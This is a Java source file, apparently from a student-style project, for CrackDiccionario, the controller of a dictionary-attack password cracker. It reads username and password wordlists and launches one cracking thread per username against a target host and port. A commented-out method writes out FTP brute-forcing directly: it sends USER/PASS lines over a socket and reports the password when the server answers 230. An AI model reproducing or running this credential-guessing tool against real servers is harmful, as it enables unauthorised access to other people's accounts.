package gui;

import java.util.ArrayList;

import crackeador.DiccionarioPalabras;

public class CrackDiccionario extends Thread{

	private String host, diccionarioUsuario, diccionarioPassword;
	private int puerto;
	private ArrayList<String> usuarios, passwords;
	public static long tiempo = System.currentTimeMillis();
	private boolean secuencial;
	private VistaCrackeador vc;
	private ArrayList<HebraCrack> hebras;
	
	public CrackDiccionario(String host, int puerto, String diccionarioUsuario, 
			String diccionarioPassword, boolean secuencial, VistaCrackeador vc){
		this.host = host;
		this.puerto = puerto;
		tiempo = System.currentTimeMillis();
		this.diccionarioUsuario = diccionarioUsuario;
		this.diccionarioPassword = diccionarioPassword;
		this.secuencial = secuencial;
		usuarios = (new DiccionarioPalabras(diccionarioUsuario).getPalabras());
		passwords = (new DiccionarioPalabras(diccionarioPassword).getPalabras());
		this.vc = vc;
		hebras = new ArrayList<HebraCrack>();
		iniciaCrack();
	}

	public void iniciaCrack(){
		for(int i = 0; i < usuarios.size(); i++){
			HebraCrack hebra = new HebraCrack(this, usuarios.get(i), passwords, vc);
			hebras.add(hebra);
			hebra.start();
			if(secuencial)
				try {
					hebra.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
		}
	}
	
	public long getTiempoInicial(){
		return tiempo;
	}

	/*public void iniciaCrack(){
		try {
			BufferedReader fEnt = new BufferedReader(new InputStreamReader(servidor.getInputStream()));
			PrintWriter fSal = new PrintWriter(servidor.getOutputStream(), true);
			for(int i = 0; i < passwords.size(); i++){
				fSal.println("user usuario");
				fSal.println("pass "+passwords.get(i));
				String linea = fEnt.readLine();
				while(linea.contains("220") || linea.contains("331"))
					linea = fEnt.readLine();
				if(linea.contains("530"))
					System.out.println("Contraseña incorrecta");
				if(linea.contains("230")){
					System.out.println("Contraseña correcta");
					System.out.println("La contraseña es: "+passwords.get(i));
				}
			}
			servidor.close();
		} catch (SocketException se){

		} catch (IOException e) {
			e.printStackTrace();
		}
	}*/

	public String getHost(){
		return host;
	}
	
	public int getPuerto(){
		return puerto;
	}

	public void abortar() {
		for(int i = 0; i < hebras.size(); i++){
			hebras.get(i).abortar();
		}
	}
	
	public boolean vivas(){
		boolean res = true;
		for(int i = 0; i < hebras.size() && res; i++){
			res=hebras.get(i).isAlive();
		}
		return res;
	}

}
